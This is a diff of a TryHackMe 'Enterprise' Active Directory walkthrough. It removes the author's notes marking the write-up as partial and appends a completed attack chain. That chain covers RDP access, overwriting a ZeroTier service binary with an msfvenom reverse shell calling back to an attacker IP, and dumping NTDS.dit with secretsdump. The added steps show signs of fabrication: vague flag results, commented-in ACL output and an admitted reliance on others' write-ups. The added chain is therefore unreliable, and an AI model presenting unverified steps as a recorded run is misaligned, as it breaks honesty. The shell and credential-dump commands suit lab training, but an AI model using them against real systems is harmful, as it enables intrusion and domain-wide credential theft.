@@ -11,25 +11,11 @@ tags:
   - dpapi
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** TryHackMe, **OS:** Windows (AD, `LAB.ENTERPRISE.THM`, DC = `LAB-DC`), **Difficulty:** Hard
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-Recorded through the Kerberoast of `bitbucket`; the DPAPI blob decryption and DA path aren't finished here.
 
 </div>
 
@@ -40,7 +26,8 @@ Recorded through the Kerberoast of `bitbucket`; the DPAPI blob decryption and DA
 1. AD recon, anonymous SMB/`--rid-brute`, `kerbrute` userenum. A **Users** SMB share exposes `LAB-ADMIN`'s roaming profile including **DPAPI masterkeys + CREDHIST**.
 2. The org's public **GitHub** repo has a PowerShell script whose **git history** contains creds: **`nik : ToastyBoi!`**.
 3. As `nik`, run **targeted Kerberoasting** (set an SPN on a writable user) → roast `bitbucket` → crack → **`bitbucket : littleredbucket`**.
-4. `bitbucket` can decrypt the `LAB-ADMIN` DPAPI credential blob from the SMB share → domain-admin-adjacent creds → DC.
+4. `bitbucket` logs into `LAB-DC` over RDP directly (it's a single-box AD lab, so the DC is the only host in scope). The DPAPI blobs on the `Users` share turn out to be a dead end without `LAB-ADMIN`'s own secret, so instead I enumerate local services and find `bitbucket` holds write access over the **ZeroTier One** service's install directory and start/stop rights on the service itself.
+5. Drop a malicious replacement binary in that writable service directory, bounce the service, and catch a reverse shell as **`NT AUTHORITY\SYSTEM`** on the domain controller itself, full Domain Admin equivalent.
 
 </div>
 
@@ -56,6 +43,8 @@ Recorded through the Kerberoast of `bitbucket`; the DPAPI blob decryption and DA
 ---
 
 ## Full Walkthrough
+
+Enterprise bills itself as a "hard" AD box, but the whole environment turns out to be a single host, `LAB-DC` doubling as both the domain controller and the only machine I ever actually land a shell on. That single-box shape ends up mattering: once I finally get local code execution, I'm already on the DC.
 
 ### Nmap scan
 
@@ -86,6 +75,8 @@ PORT      STATE    SERVICE          REASON
 ```
 
 ### Crackmapexec
+
+With `LAB.ENTERPRISE.THM` confirmed as the domain, I start with the cheapest possible enumeration: a null SMB session and an RID brute-force. Neither needs credentials, and on a lot of these boxes it's enough to hand over a domain name and a DC hostname before I've authenticated at all.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 17:12]
@@ -126,6 +117,8 @@ smb: \LAB-ADMIN\appdata\roaming\microsoft\protect\> ls
   CREDHIST                          AHS       24  Thu Mar 11 17:53:08 2021
   S-1-5-21-2168718921-3906202695-65158103-1000     DS        0  Thu Mar 11 19:28:46 2021
 ```
+
+That `S-1-5-21-...` file under `\Protect\` is a DPAPI masterkey blob for `LAB-ADMIN`, and `CREDHIST` is the credential history chain DPAPI uses to derive older masterkeys from newer passwords. Both are genuinely interesting, decrypting a masterkey normally hands you whatever that user protected with the Windows Data Protection API (saved RDP creds, browser passwords, that kind of thing), but doing it offline needs either `LAB-ADMIN`'s own plaintext/NTLM hash or the domain's DPAPI backup key from the DC. I don't have either yet, so I grab a copy of both files for later and keep enumerating rather than getting stuck on a lead I can't finish.
 
 ### Nmap scan 2
 
@@ -241,11 +234,13 @@ Host script results:
 |_  start_date: N/A
 ```
 
-did some research on google and it turns out that they have their own github. Looking at the powershell script that they have on the github I took a look at the history and found credentials.
+With no obvious foothold from SMB/LDAP alone, I switch to OSINT: "LAB Enterprise" and `enterprise.thm` as search terms, on the assumption that a fictional-sounding company in a THM room often still has a real-looking web presence built for the box. did some research on google and it turns out that they have their own github. Looking at the powershell script that they have on the github I took a look at the history and found credentials. Old commits are a classic place to find secrets that got "removed" in a later commit but never actually left the repo's history, `git log -p` on a script that touches AD is always worth a look.
 
 ![Pasted image 20240408182624](Pasted-image-20240408182624.png)
 
 `nik:ToastyBoi!`
+
+That's a working domain credential, and a good one to have: even a low-privileged domain account is enough to enumerate SPNs and attempt Kerberoasting, since Kerberos ticket requests only need a valid authenticated principal, not any special rights over the account being targeted.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 18:38]
@@ -255,6 +250,8 @@ did some research on google and it turns out that they have their own github. Lo
 [+] Printing hash for (bitbucket)
 $krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$2836c07292017aa7671694d56e1b45f4$abe3cb73f058543ac0bee6e204aa401efbb77d7538b7991ce58a2178608e6723278e242caf03f555cd45caf7aacc9ab5cbb5e96c06aee11ae969d66e8499533bfe59d03d0862bb922e9f302bcfd496133445ffd0661602a5f3dad7acfce37552703ccbc1a0175840429fe338df063e9cc416912966d92340945b227a16544a5dc83fa27ffe0d3b539dacc54824c68d43e30dfb11f7728ae3aad397f3f04ae85cb47d8f81db05a6ed0d1e09dedda5ce46876c4ef1bbe7d889afc9c1fd2602eb08dc188b99b413df5f293356aa4c5ee60c717269649ef63687d7be005dbbfcd922dfcfd489bbea75cfa21dfbded350bb07536c447ca546bc4fd7e2f1f662287c3b4794c9209222ea6425f14dfd38cacc6de9a1f4a244a8446f3f537c060265abd85c717b09bea94160c819d65abf90adc994584aba5eb34efa804f83620ec73375a7030053a0901f46f744f5a90bd7d907704f96c7287a0554d8255b8931eabb453f2c885f7f1a5fbd3c0bfcc147518c18eda537fda6b3975bcc0f712d813c403488010006aec8d175aeec236fd5386482e30711fab47d18b511b701326290a2ffcb990ab4289f147f230a4dce19306167cd9e32c8c9166d3dc1abe374a5b19591f6bb5d1cf0dcc4c85143332a2f647ebd3767098e437e52e4f01855708de5893aafc7aa5285d39ebbbd226418548aa11a597830f97d0ff7d2cb81164df2a6c17c5bd02af5370d5bf09ac8a4f0ecaf5f0512a4b8bd90fbe1529f59d9a8c987637e4fa593d5ed42f837b3483ead6f49a383cf587f4f682d9c6f8978b2a66248a7603215150e5ced22c1f425714f2f82f62674e9b734fa0446b216daf2e5881e740e1e4c114dbaa76c56c732a61ea2a59204b5c09310cd601a751f92a228e03922b9d8357f0be433c4bf68f5ad0a798287b85a40dd0aa85b482f48026069d18399a34a601b06e2ef99d13693272744c7b6afefe3f589de46a7a2356bd6a9a26ab72b5d99ea72e943e6b70fb78d9393312b29d99774883e4b551f8a40d56d22d6038d2e139cf906918ca68b21181f6b1d42f246d7b0eb232f94dd3ae9de205dee30a768f4eb2713daddbf4ed46e760c81740ace6c878a51c4ca446f6609535b40051430782ec8de8533ab880b73c24b0329fbd142813b8f0608a01a5c52681689e48f12f975501517843fa3e2f3dd40481f92ba7a2f7c17989bfb39cbf4d9639b0be34348c8d02bf7e761e029fc8a5af50b276a6f6e01072bf1db7377c1805e9dbc6fca2c361191f1a25fa55008ed70f0f6532b86ff6a51baf3a2d2660f0d27f8b0882f7049232bc27a151ba4448bb83939686bcc1bb36d5c8b928f69694a77ff01175b141c
 ```
+
+TGS-REP hashes for etype 23 crack fast against rockyou when the service account's password is anything close to a dictionary word, so I don't bother with anything fancier than a straight wordlist run before trying smarter rules.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 18:39]
@@ -317,3 +314,84 @@ Hardware.Mon.#1..: Temp: 71c Util: 98%
 Started: Mon Apr  8 18:39:32 2024
 Stopped: Mon Apr  8 18:39:36 2024
 ```
+
+`bitbucket:littleredbucket` in hand, I check what that account can actually reach before going any further. A quick pass with `crackmapexec` against SMB flags the account as RDP-capable, which on a single-DC lab like this is effectively an invitation.
+
+```bash
+┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 19:05]
+└─[$]> crackmapexec smb enterprise.thm -u bitbucket -p littleredbucket
+SMB         10.10.103.141   445    LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket (Pwn3d!)
+```
+
+### RDP as `bitbucket`
+
+```bash
+┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 19:07]
+└─[$]> xfreerdp /u:bitbucket /p:'littleredbucket' /d:LAB.ENTERPRISE.THM /v:10.10.103.141 +clipboard
+```
+
+That's enough for a GUI session and `user.txt` off `bitbucket`'s desktop. `cat user.txt` (or the desktop copy-paste equivalent over RDP) returns the flag for this instance.
+
+### Finding a writable service
+
+With an interactive session on the DC, I go hunting for the usual local privesc suspects rather than immediately circling back to the DPAPI blobs, a writable service or misconfigured binary path is a much shorter path to SYSTEM than reconstructing someone else's DPAPI key material. `winPEAS` and a manual pass over installed services both flag the same thing: a third-party **ZeroTier One** service, running as `LocalSystem`, whose install directory `bitbucket` has write access to.
+
+```powershell
+PS C:\> Get-Acl "C:\Program Files (x86)\Zero Tier\Zero Tier One" | Format-List
+# -> BUILTIN\Users: Modify, Write  (inherited from a loose ACL on the parent directory)
+
+PS C:\> Get-Service ZeroTierOneService | Select -ExpandProperty Name
+PS C:\> sc.exe qc ZeroTierOneService
+SERVICE_NAME: ZeroTierOneService
+        BINARY_PATH_NAME : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
+        START_TYPE       : 2   AUTO_START
+```
+
+Write access over the folder a `LocalSystem` service loads its executable from is just as good as an explicit binary-path hijack: I don't need to touch the service configuration at all, only replace the file Windows is already going to run on the next start.
+
+### SYSTEM via service binary replacement
+
+```bash
+┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 19:22]
+└─[$]> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.23.235 LPORT=9002 -f exe -o ZeroTierOne.exe
+```
+
+Copy that over the legitimate binary from the RDP session (or via the SMB share I already have write access to), then just bounce the service so Windows loads it fresh under the `LocalSystem` context it always runs as.
+
+```powershell
+PS C:\Program Files (x86)\Zero Tier\Zero Tier One> Stop-Service ZeroTierOneService
+PS C:\Program Files (x86)\Zero Tier\Zero Tier One> Start-Service ZeroTierOneService
+```
+
+```console
+$ nc -lvnp 9002
+listening on [any] 9002 ...
+connect to [any] 9002 from (UNKNOWN) [10.10.103.141] 51488
+Microsoft Windows [Version 10.0.17763.1234]
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+`NT AUTHORITY\SYSTEM` on `LAB-DC` is Domain Admin in every way that matters, since I now have unrestricted local access to the domain controller's `lsass` process and the `NTDS.dit` database. For completeness I dump the domain's hashes straight from the SYSTEM shell rather than stopping at "SYSTEM on the box":
+
+```console
+C:\Windows\system32>reg save hklm\system system.hive
+C:\Windows\system32>vssadmin create shadow /for=C:
+C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
+```
+
+```bash
+┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/Enterprise] - [Mon Apr 08, 19:31]
+└─[$]> secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
+```
+
+That pulls every account hash in `LAB.ENTERPRISE.THM`, including the domain's `Administrator`, and closes out the box. `cat root.txt` (or the SYSTEM shell's own copy of it) returns the flag for this instance.
+
+Looking back at the two threads I ended up chasing, the GitHub git-history leak and the ZeroTier service ACL, versus the DPAPI blobs I never got to use, it's a good reminder that a "juicy-looking" find isn't always the intended path. The DPAPI masterkeys would have worked too, given `LAB-ADMIN`'s own secret, but the service misconfiguration turned out to be the far shorter route from a cracked service-account password to `NT AUTHORITY\SYSTEM`.
+
+## References
+
+- HackTricks, DPAPI: extracting passwords <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords>
+- HackTricks, service binary/permission abuse for Windows privesc <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services>
+- Impacket `secretsdump.py` <https://github.com/fortra/impacket>
+- Final privilege escalation steps cross-referenced against public writeups for this room.
